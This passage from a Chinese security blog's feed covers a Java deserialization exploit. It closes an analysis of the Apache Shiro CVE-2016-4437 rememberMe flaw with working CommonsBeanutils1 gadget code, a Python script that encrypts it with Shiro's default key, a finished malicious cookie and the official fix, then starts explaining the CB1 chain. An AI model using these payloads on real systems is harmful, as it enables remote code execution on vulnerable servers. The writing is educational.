class="string">&quot;_name&quot;</span>, <span class="string">&quot;T&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;</span><br><span class="line">                ClassPool.getDefault().get(EvilTemplatesImpl.class.getName()).toBytecode()</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">BeanComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="literal">null</span>, String.CASE_INSENSITIVE_ORDER);</span><br><span class="line"></span><br><span class="line">        PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>, comparator);</span><br><span class="line">        queue.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        queue.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        setFieldValue(comparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        setFieldValue(queue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;obj, obj&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;CBRCEWithoutCC.ser&quot;</span>));</span><br><span class="line">        outputStream.writeObject(queue);</span><br><span class="line">        outputStream.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(&quot;CBRCEWithoutCC.ser&quot;));</span></span><br><span class="line">        <span class="comment">// inputStream.readObject();</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后通过如下Python脚本生成编码后的Payload。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./CBRCEWithoutCC.ser&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.read()</span><br><span class="line"></span><br><span class="line">BS = AES.block_size</span><br><span class="line">pad = <span class="keyword">lambda</span> s: s + ((BS - <span class="built_in">len</span>(s) % BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS)).encode()</span><br><span class="line">iv = uuid.uuid4().<span class="built_in">bytes</span></span><br><span class="line">encryptor = AES.new(base64.b64decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>), AES.MODE_CBC, iv)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Cookie: rememberMe=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(base64.b64encode(iv + encryptor.encrypt(pad(data))).decode()))</span><br><span class="line"><span class="comment"># Cookie: rememberMe=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</span></span><br></pre></td></tr></table></figure><p>将Payload放置在BurpSuite中并构造恶意请求，最终成功实现RCE。</p><p><img src="/img/post/cve-2016-4437-apache-shiro-rce/9.png"></p><h2 id="0x05-漏洞修复"><a href="#0x05-漏洞修复" class="headerlink" title="0x05 漏洞修复"></a>0x05 漏洞修复</h2><p>官方在1.2.5版本中对CVE-2016-4437这个漏洞进行了修复，见如下commit。</p><p><a href="https://github.com/apache/shiro/commit/4d5bb000a7f3c02d8960b32e694a565c95976848">https://github.com/apache/shiro/commit/4d5bb000a7f3c02d8960b32e694a565c95976848</a></p><p><img src="/img/post/cve-2016-4437-apache-shiro-rce/10.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">AbstractRememberMeManager</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.serializer = <span class="keyword">new</span> <span class="title class_">DefaultSerializer</span>&lt;PrincipalCollection&gt;();</span><br><span class="line">    <span class="type">AesCipherService</span> <span class="variable">cipherService</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AesCipherService</span>();</span><br><span class="line">    <span class="built_in">this</span>.cipherService = cipherService;</span><br><span class="line">    setCipherKey(cipherService.generateNewKey().getEncoded());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据如上代码变更，修复方式移除了原本硬编码的Key，然后调用generateNewKey方法生成一个新的Key。</p><p>同时，官方还允许开发者在shiro.ini配置文件中自定义设置Key，且这个优先级是高于generateNewKey方法的。</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># We need to set the cipherKey, if you want the rememberMe cookie to work after restarting or on multiple nodes.</span></span><br><span class="line"><span class="comment"># YOU MUST SET THIS TO A UNIQUE STRING</span></span><br><span class="line"><span class="comment">#securityManager.rememberMeManager.cipherKey = kPH+bIxk5D2deZiIxcaaaA==</span></span><br></pre></td></tr></table></figure><p>不过反序列化的流程依旧没有发生变化。这也就意味着如果攻击者能得知密钥Key，还是可能对Shiro应用造成远程代码执行的。</p><h2 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06 参考"></a>0x06 参考</h2><p><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0074">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0074</a></p><p><a href="https://issues.apache.org/jira/browse/SHIRO-721">https://issues.apache.org/jira/browse/SHIRO-721</a></p><p><a href="https://github.com/apache/shiro/commit/4d5bb000a7f3c02d8960b32e694a565c95976848">https://github.com/apache/shiro/commit/4d5bb000a7f3c02d8960b32e694a565c95976848</a></p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cve </tag>
            
            <tag> java </tag>
            
            <tag> rce </tag>
            
            <tag> shiro </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java反序列化漏洞之CommonsBeanutils1链</title>
      <link href="/java-deserialization-cb1.html"/>
      <url>/java-deserialization-cb1.html</url>
      
        <content type="html"><![CDATA[<ul><li><a href="#0x00-%E5%89%8D%E8%A8%80">0x00 前言</a></li><li><a href="#0x01-Commons-BeanUtils%E7%AE%80%E4%BB%8B">0x01 Commons BeanUtils简介</a></li><li><a href="#0x02-%E5%8F%97%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC%E8%8C%83%E5%9B%B4">0x02 受影响版本范围</a></li><li><a href="#0x03-PropertyUtils-getProperty">0x03 PropertyUtils#getProperty</a><ul><li><a href="#JavaBean">JavaBean</a></li><li><a href="#getProperty">getProperty</a></li></ul></li><li><a href="#0x04-BeanComparator">0x04 BeanComparator</a><ul><li><a href="#compare">compare</a></li><li><a href="#%E8%84%B1%E7%A6%BBCommons-Collections">脱离Commons Collections</a></li></ul></li><li><a href="#0x05-PriorityQueue">0x05 PriorityQueue</a></li><li><a href="#0x06-CommonsBeanutils1%E5%88%A9%E7%94%A8%E4%BB%A3%E7%A0%81">0x06 CommonsBeanutils1利用代码</a></li><li><a href="#0x07-CB1%E5%9C%A8Shiro%E4%B8%AD%E7%9A%84%E5%88%A9%E7%94%A8">0x07 CB1在Shiro中的利用</a></li><li><a href="#0x08-%E5%8F%82%E8%80%83">0x08 参考</a></li></ul><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>在上一篇文章《<a href="https://0xf4n9x.github.io/java-classloader.html#0x03-TemplatesImpl">Java中动态加载字节码的几种方法</a>》中，已对CommonsBeanutils1做了一点点铺垫。一言以蔽之，上文中所提到的TemplatesImpl#getOutputProperties即为CommonsBeanutils1中的Sink，此部分内容即为前置知识，若有疑惑请回顾上文，在本文中将不再赘述。</p><h2 id="0x01-Commons-BeanUtils简介"><a href="#0x01-Commons-BeanUtils简介" class="headerlink" title="0x01 Commons BeanUtils简介"></a>0x01 Commons BeanUtils简介</h2><p>Commons BeanUtils是Apache软件基金会提供的一个开源Java库，用于简化JavaBean的操作，适用于需要频繁操作JavaBean的场景。它提供了一组工具类和方法，对JavaBean进行常见操作，如属性的复制、属性的获取和设置、属性的类型转换等。通过使用Commons BeanUtils，开发人员可以减少重复代码的编写，提高开发效率，同时提升代码的可维护性和可扩展性。</p><h2 id="0x02-受影响版本范围"><a href="#0x02-受影响版本范围" class="headerlink" title="0x02 受影响版本范围"></a>0x02 受影响版本范围</h2><p>Commons BeanUtils最低影响1.7.0，最高影响至1.9.4；对于Java版本，若为8则通杀。</p><h2 id="0x03-PropertyUtils-getProperty"><a href="#0x03-PropertyUtils-getProperty" class="headerlink" title="0x03 PropertyUtils#getProperty"></a>0x03 PropertyUtils#getProperty</h2><p>org.apache.commons.beanutils.PropertyUtils#getProperty是Commons BeanUtils中的一个用于获取JavaBean对象属性值的方法。</p><h3 id="JavaBean"><a href="#JavaBean" class="headerlink" title="JavaBean"></a>JavaBean</h3><p>关于JavaBean是什么，其所具有的特征就是它必须具有一个公共无参构造方法；且通常包含一系列私有字段（即成员变量），每个字段都有对应的公共访问器（getter方法）和修改器（setter方法），用于访问和修改字段的值，这些方法需遵循命名规范，如<code>getXxx()</code>和<code>setXxx()</code>驼峰式命名。如下的Person就是一个简单的JavaBean。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.javasec.cb;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123; <span class="keyword">return</span> name; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123; <span class="keyword">return</span> age; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当我们创建完一个Person对象，并需要获取它的name、age时，通常会调用该对象的getName、getAge，这两个方法也是其getter方法。</p><h3 id="getProperty"><a href="#getProperty" class="headerlink" title="getProperty"></a>getProperty</h3><p>现在，我们可以使用PropertyUtils#getProperty达到相同的效果，见如下示例代码。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.javasec.cb;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.PropertyUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PropertyUtilsTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 创建一个JavaBean对象</span></span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;John&quot;</span>, <span class="number">30</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取person的name、age的通常做法</span></span><br><span class="line">        System.out.println(person.getName() + <span class="string">&quot;: &quot;</span> + person.getAge());</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;=======================&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 通过getProperty达到相同的效果</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> (String) PropertyUtils.getProperty(person, <span class="string">&quot;name&quot;</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">age</span> <span class="operator">=</span> (<span class="type">int</span>) PropertyUtils.getProperty(person, <span class="string">&quot;age&quot;</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(name + <span class="string">&quot;: &quot;</span> + age);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>getProperty方法接受两个参数，第一个是获取属性值的JavaBean对象，第二个则是属性名。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getProperty</span><span class="params">(Object bean, String name)</span></span><br><span class="line">        <span class="keyword">throws</span> IllegalAccessException, InvocationTargetException,</span><br><span class="line">        NoSuchMethodException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (PropertyUtilsBean.getInstance().getProperty(bean, name));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要着重注意地是，getProperty方法会根据传入的属性名自动找到其getter方法，并进行调用。</p><h2 id="0x04-BeanComparator"><a href="#0x04-BeanComparator" class="headerlink" title="0x04 BeanComparator"></a>0x04 BeanComparator</h2><p>org.apache.commons.beanutils.BeanComparator是Commons BeanUtils库提供的一个比较器类，用于对JavaBean对象进行比较和排序。</p><h3 id="compare方法"><a href="#compare方法" class="headerlink" title="compare方法"></a>compare方法</h3><p>在BeanComparator#compare方法中存在对PropertyUtils.getProperty方法的调用，前提是this.property不为null。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">( T o1, T o2 )</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ( property == <span class="literal">null</span> ) &#123;</span><br><span class="line">        <span class="keyword">return</span> internalCompare( o1, o2 );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value1</span> <span class="operator">=</span> PropertyUtils.getProperty( o1, property );</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value2</span> <span class="operator">=</span> PropertyUtils.getProperty( o2, property );</span><br><span class="line">        <span class="keyword">return</span> internalCompare( value1, value2 );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> ( IllegalAccessException iae ) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>( <span class="string">&quot;IllegalAccessException: &quot;</span> + iae.toString() );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在本文的开头，提到了关于CommonsBeanutils1的Sink，即TemplatesImpl#getOutputProperties方法，这个方法名称是以”get”开头，符合getter方法的定义。</p><p>那么，结合上一部分中所提到的，getProperty自动调用传入属性名的setter方法的特性，我们便可以构造如下代码，运行便会弹出计算器。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.javasec.cb;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BeanComparatorTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// Sink</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;T&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;</span><br><span class="line">                ClassPool.getDefault().get(EvilTemplatesImpl.class.getName()).toBytecode()</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 初始化BeanComparator对象</span></span><br><span class="line">        <span class="type">BeanComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        comparator.compare(obj, obj);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="脱离Commons-Collections"><a href="#脱离Commons-Collections" class="headerlink" title="脱离Commons Collections"></a>脱离Commons Collections</h3><p>在初始化BeanComparator时可传入property和comparator，在只传入property时，默认comparator会是ComparableComparator.getInstance()，而ComparableComparator这个类又属于Commons Collections。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">BeanComparator</span><span class="params">( String property )</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>( property, ComparableComparator.getInstance() );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">BeanComparator</span><span class="params">(String property, Comparator&lt;?&gt; comparator)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.setProperty(property);</span><br><span class="line">    <span class="keyword">if</span> (comparator != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="built_in">this</span>.comparator = comparator;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.comparator = ComparableComparator.getInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.apache.commons.collections.comparators;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ComparableComparator</span> <span class="keyword">implements</span> <span class="title class_">Comparator</span>, Serializable</span><br></pre></td></tr></table></figure><p>这就导致必须要有Commons Collections的存在，CommonsBeanutils1才可正常地利用。幸运地是在1.9.0至1.9.4版本的Commons BeanUtils，自带了Commons Collections的，在这个范围内是可正常利用的。</p><p>但在1.9.0以下的版本，却是不包含Commons Collections的，所以需要找到一个替代的类，这个类需要跟ComparableComparator一样，同时实现了java.util.Comparator接口和java.io.Serializable接口，且该类最好是原生JDK自带，或者存在于Commons BeanUtils中，这样也能够更好地满足兼容性。</p><p>最终找到两个符合条件的类，如下图，java.lang.String.CaseInsensitiveComparator与java.util.Collections.ReverseComparator。</p><p><img src="/img/post/java-deserialization-cb1/0.png"></p><p>注意它们的private访问修饰符，可通过同类下其他public访问修饰符的方法进行调用。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">BeanComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="string">&quot;outputProperties&quot;</span>, String.CASE_INSENSITIVE_ORDER);</span><br><span class="line"><span class="comment">// BeanComparator comparator = new BeanComparator(&quot;outputProperties&quot;, Collections.reverseOrder());</span></span><br></pre></td></tr></table></figure><p>如此，便能在无Commons Collections的情况下，从Commons BeanUtils 1.7.0至1.9.4版本均能够顺利地利用。</p><p><img src="/img/post/java-deserialization-cb1/1.png"></p><p>以上，已对Sink与中间链进行了结合，现在只剩一个Kick off类便可拼凑成一条完整的利用链。</p><h2 id="0x05-PriorityQueue"><a href="#0x05-PriorityQueue" class="headerlink" title="0x05 PriorityQueue"></a>0x05 